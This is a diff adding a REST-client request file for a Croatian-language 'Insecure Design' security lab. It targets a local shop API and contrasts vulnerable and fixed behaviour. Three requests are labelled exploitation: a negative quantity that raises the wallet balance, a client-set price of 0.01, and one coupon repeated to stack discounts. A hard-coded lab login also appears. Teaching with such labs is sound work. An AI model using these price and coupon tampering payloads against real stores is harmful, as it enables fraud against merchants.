@@ -1,0 +1,44 @@
+### Lab10 – Insecure Design (poslovna logika)
+@host = http://localhost:8000
+@token = PASTE_TOKEN
+
+### 1. Prijava (kopiraj token u @token)
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{"username": "ana", "password": "Ana123!"}
+
+### 2. Stanje novcanika (seed 1000.00 EUR)
+GET {{host}}/api/lab10/wallet
+Authorization: Bearer {{token}}
+
+### 3. EKSPLOATACIJA: negativna kolicina POVECAVA stanje
+# Ranjivo (main): stanje poraste. Popravljeno: 400.
+POST {{host}}/api/lab10/checkout
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"items": [{"productId": 1, "quantity": -5, "unitPrice": 899.00}], "couponCodes": []}
+
+### 4. EKSPLOATACIJA: lazna cijena 0.01 za laptop
+# Ranjivo (main): naplaceno 0.01. Popravljeno: cijena iz baze (899.00) ili 400.
+POST {{host}}/api/lab10/checkout
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"items": [{"productId": 1, "quantity": 1, "unitPrice": 0.01}], "couponCodes": []}
+
+### 5. EKSPLOATACIJA: isti kupon vise puta
+# Ranjivo (main): popust se slaze. Popravljeno: 400 ili jednom.
+POST {{host}}/api/lab10/checkout
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"items": [{"productId": 2, "quantity": 1, "unitPrice": 99.00}], "couponCodes": ["AKADEMIJA10","AKADEMIJA10","AKADEMIJA10"]}
+
+### 6. Legitiman checkout (1x Kabel)
+POST {{host}}/api/lab10/checkout
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"items": [{"productId": 3, "quantity": 1, "unitPrice": 9.99}], "couponCodes": []}
